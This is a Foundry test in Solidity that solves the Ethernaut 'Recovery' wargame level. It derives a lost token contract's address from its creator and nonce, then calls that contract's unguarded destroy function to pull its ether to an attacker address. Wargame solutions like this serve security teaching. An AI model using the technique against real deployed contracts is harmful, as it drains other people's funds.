// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import 'ds-test/test.sol';
import 'forge-std/Vm.sol';

import '../levels/17-Recovery/RecoveryFactory.sol';
import '../core/Ethernaut.sol';

contract RecoveryTest is DSTest {
  //--------------------------------------------------------------------------------
  //                            Setup Game Instance
  //--------------------------------------------------------------------------------

  Vm vm = Vm(address(HEVM_ADDRESS)); // `ds-test` library cheatcodes for testing
  Ethernaut ethernaut;
  address attacker = address(0xdeadbeef);

  function setUp() public {
    ethernaut = new Ethernaut(); // initiate Ethernaut contract instance
    vm.deal(attacker, 100 ether); // fund our attacker contract with 1 ether
  }

  function testRecoveryHack() public {
    //--------------------------------------------------------------------------------
    //                             Setup Level Instance
    //--------------------------------------------------------------------------------

    RecoveryFactory recoveryFactory = new RecoveryFactory();
    ethernaut.registerLevel(recoveryFactory);
    vm.startPrank(attacker);
    address levelAddress = ethernaut.createLevelInstance{ value: 1 ether }(
      recoveryFactory
    );
    Recovery recoveryContract = Recovery(payable(levelAddress));

    //--------------------------------------------------------------------------------
    //                             Start Level Attack
    //--------------------------------------------------------------------------------

    // Contract addresses are deterministic (from Ethereum yellow paper):
    //
    // The address of the new account is defined as being the rightmost 160 bits of the Keccak hash of the RLP encoding of the structure containing only the sender and the account nonce. Thus we define the resultant address for the new account a
    //
    // address = rightmost_20_bytes(keccak(RLP(sender address, nonce)))
    //  - sender address: is the contract or wallet address that created this new contract
    //  - nonce: is the number of transactions sent from the sender address OR, if the sender is a factory contract, the nonce is the number of contract-creations made by this account.
    //  - RLP: is an encoder on data structure, and is the default to serialize objects in Ethereum.

    // RLP encoding of a 20-byte address is: 0xd6, 0x94 . And for all integers less than 0x7f, its encoding is just its own byte value. So the RLP of 1 is 0x01.

    // Calculate the SimpleToken contract address from its parent contract
    address simpleTokenAddr = address(
      uint160(
        uint256(
          keccak256(
            abi.encodePacked(
              uint8(0xd6),
              uint8(0x94),
              address(recoveryContract),
              uint8(0x01) // nonce = 1 since Recovery only deployed one contract
            )
          )
        )
      )
    );

    uint256 old_balance = attacker.balance;
    SimpleToken(payable(simpleTokenAddr)).destroy(payable(address(attacker)));
    assertEq(attacker.balance, old_balance + 0.001 ether); // Amount sent during Factory setup

    //--------------------------------------------------------------------------------
    //                                Submit Level
    //--------------------------------------------------------------------------------
    bool challengeCompleted = ethernaut.submitLevelInstance(
      payable(levelAddress)
    );
    vm.stopPrank();
    assert(challengeCompleted);
  }
}
